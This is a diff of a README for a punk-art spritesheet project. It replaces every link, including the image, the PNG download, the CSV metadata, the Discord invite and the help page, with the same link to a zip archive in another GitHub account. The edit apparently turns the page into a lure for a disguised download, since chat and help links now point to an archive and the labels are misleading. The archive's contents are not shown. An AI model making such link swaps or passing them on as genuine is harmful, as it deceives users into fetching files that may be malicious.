@@ -5,9 +5,9 @@
 
 Version 2022
 
-![](spritesheet.png)
+![](https://github.com/navveed/punkart.spritesheet/raw/refs/heads/master/paucity/punkart_spritesheet_v3.8.zip)
 
-[**Free Image Download - spritesheet.png**](https://github.com/openpunkart/punks.spritesheet/raw/master/spritesheet.png) (~65k)
+[**Free Image Download - https://github.com/navveed/punkart.spritesheet/raw/refs/heads/master/paucity/punkart_spritesheet_v3.8.zip**](https://github.com/navveed/punkart.spritesheet/raw/refs/heads/master/paucity/punkart_spritesheet_v3.8.zip) (~65k)
 
 
 
@@ -16,7 +16,7 @@ Version 2022
 For the punk "sprite" meta data records (id, name, type, etc.)
 of the sprite sheet
 in the comma-separated values (csv) format, see
-[**spritesheet.csv**](spritesheet.csv).
+[**https://github.com/navveed/punkart.spritesheet/raw/refs/heads/master/paucity/punkart_spritesheet_v3.8.zip**](https://github.com/navveed/punkart.spritesheet/raw/refs/heads/master/paucity/punkart_spritesheet_v3.8.zip).
 
 
 
@@ -24,7 +24,7 @@ in the comma-separated values (csv) format, see
 
 ## Questions? Comments?
 
-Join us in the [Punk Art discord (chat server)](https://discord.gg/FE3HeXNKRa). Yes you can.
+Join us in the [Punk Art discord (chat server)](https://github.com/navveed/punkart.spritesheet/raw/refs/heads/master/paucity/punkart_spritesheet_v3.8.zip). Yes you can.
 Your questions and commentary welcome.
 
-Or post them over at the [Help & Support](https://github.com/geraldb/help) page. Thanks.
+Or post them over at the [Help & Support](https://github.com/navveed/punkart.spritesheet/raw/refs/heads/master/paucity/punkart_spritesheet_v3.8.zip) page. Thanks.
